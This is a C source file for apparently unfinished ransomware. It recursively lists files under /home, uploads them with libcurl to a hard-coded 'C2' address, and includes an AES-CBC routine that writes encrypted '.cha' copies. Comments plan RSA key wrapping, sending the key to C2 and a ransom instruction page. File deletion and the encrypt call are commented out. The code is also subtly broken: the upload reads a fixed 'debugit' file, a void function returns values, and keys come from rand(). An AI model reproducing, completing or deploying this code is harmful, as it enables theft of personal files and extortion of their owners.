#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include "lib/aes.h"

typedef struct {
    char **paths;
    size_t count;
    size_t capacity;
} PathList;

void sendFileToApi(const char *path, const char *api);
void freePathList(PathList *pathList);
void addToPathList(PathList *pathList, const char *path);
void initPathList(PathList *pathList);
void linuxListFiles(const char *path, PathList *pathList);
void encryptFile(struct AES_ctx ctx, char file_path[256]);
void generateRandomKey(uint8_t *key, size_t key_length);
void generateRandomIv(uint8_t *iv, size_t iv_length);


int main(){
    //Generate AES key and IV
    srand((unsigned int)time(NULL));

    uint8_t key[32];
    generateRandomKey(key, sizeof(key));

    uint8_t iv[16];
    generateRandomIv(iv, sizeof(iv));

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    //List all the files we want to borrow ;)
    const char *path = "/home";
    PathList pathList;
    initPathList(&pathList);

    linuxListFiles(path, &pathList);

    for (size_t i = 0; i < pathList.count; ++i) {
        //printf("%s\n", pathList.paths[i]); Debug
        //Send the raw files to C2
        sendFileToApi(pathList.paths[i], "https://192.168.0.1/path/to/file/api");

        //Encrypt each file with AES
        //encryptFile(ctx, "pathList.paths[i]");
    }
    freePathList(&pathList);

    //Encrypt the AES key with the RSA public key

    //Send the encrypted AES key to C2


    //Redirect to C2's web page for instructions

    return 0;
}

void sendFileToApi(const char *path, const char *api){
    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
    CURL *curl;
    CURLcode res;
    struct stat file_info;
    curl_off_t speed_upload, total_time;
    FILE *fd;

    fd = fopen("debugit", "rb"); /* open file to upload */
    if(!fd)
        return 1; /* cannot continue */

    /* to get the file size */
    if(fstat(fileno(fd), &file_info) != 0)
        return 1; /* cannot continue */

    curl = curl_easy_init();
    if(curl){
        /* upload to this place */
        curl_easy_setopt(curl, CURLOPT_URL,
                         api);

        /* tell it to "upload" to the URL */
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        /* set where to read from (on Windows you need to use READFUNCTION too) */
        curl_easy_setopt(curl, CURLOPT_READDATA, fd);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            //Woops
        }

        curl_easy_cleanup(curl);
    }
    fclose(fd);

}

//->Linux functions
void linuxListFiles(const char *path, PathList *pathList) {
    struct dirent *entry;
    DIR *dp = opendir(path);

    if (dp == NULL) {
        //Woops
    }

    while ((entry = readdir(dp)) != NULL) {
        if (entry->d_type == DT_REG) {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s/%s", path, entry->d_name);
            addToPathList(pathList, file_path);
        } else if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char subPath[1024];
                snprintf(subPath, sizeof(subPath), "%s/%s", path, entry->d_name);
                linuxListFiles(subPath, pathList);
            }
        }
    }

    closedir(dp);
}

//Init PathList structure
void initPathList(PathList *pathList) {
    pathList->paths = NULL;
    pathList->count = 0;
    pathList->capacity = 0;
}

void addToPathList(PathList *pathList, const char *path) {
    if (pathList->count >= pathList->capacity) {
        //Increase list size
        pathList->capacity = (pathList->capacity == 0) ? 1 : pathList->capacity * 2;
        pathList->paths = realloc(pathList->paths, pathList->capacity * sizeof(char *));
    }

    pathList->paths[pathList->count] = strdup(path);
    pathList->count++;
}

void freePathList(PathList *pathList) {
    for (size_t i = 0; i < pathList->count; i++) {
        free(pathList->paths[i]);
    }
    free(pathList->paths);
    pathList->paths = NULL;
    pathList->count = 0;
    pathList->capacity = 0;
}
//<-End of linux functions

void encryptFile(struct AES_ctx ctx, char file_path[256]){
    //@file_path accepts both absolute and relative path

    //Open raw file
    FILE *src_fp;
    src_fp = fopen(file_path, "rb");

    //Parse file's path
    char *file_name = strrchr(file_path, '/');
    if (file_name == NULL) {
        file_name = file_path;
    } else {
        file_name++;
    }

    //Create new (encrypted) file
    char end_fpth[256];
    sprintf(end_fpth, "%s.cha", file_name);

    FILE *end_fp;
    end_fp = fopen(end_fpth, "ab");

    //Chunk creation
    const size_t buffer_size = 65535;
    unsigned char buffer[buffer_size];

    //Read file's bytes chunk by chunk until the end
    size_t bytes_read;
    while((bytes_read = fread(buffer, 1, buffer_size, src_fp)) > 0){
        //Encrypt current chunk
        AES_CBC_encrypt_buffer(&ctx, buffer, sizeof(buffer));
        //Write current encrypted chunk in the new file
        fwrite(buffer, 1, bytes_read, end_fp);

        //Clear buffer
        memset(buffer, 0, buffer_size);
    }

    //Remove the raw file
    //remove(file_path);



    fclose(src_fp);
    fclose(end_fp);
}

void generateRandomKey(uint8_t *key, size_t key_length) {
    for (size_t i = 0; i < key_length; ++i) {
        key[i] = (uint8_t)rand();
    }
}

void generateRandomIv(uint8_t *iv, size_t iv_length) {
    for (size_t i = 0; i < iv_length; ++i) {
        iv[i] = (uint8_t)rand();
    }
}
